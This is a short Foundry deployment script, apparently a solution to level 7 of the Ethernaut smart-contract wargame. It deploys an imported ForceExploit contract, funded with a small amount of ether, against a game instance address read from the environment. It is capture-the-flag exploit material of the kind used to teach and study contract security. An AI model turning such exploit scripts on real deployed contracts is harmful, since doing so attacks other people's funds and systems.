// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {ForceExploit} from "src/07/ForceExploit.sol";


contract Exploit is Script {

        address payable instance = payable(vm.envAddress("INSTANCE_LEVEL7"));       
        
        function run() external {

            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

            ForceExploit exploit = new ForceExploit{value: 0.0005 ether}(instance);
            
            vm.stopBroadcast();
    }
}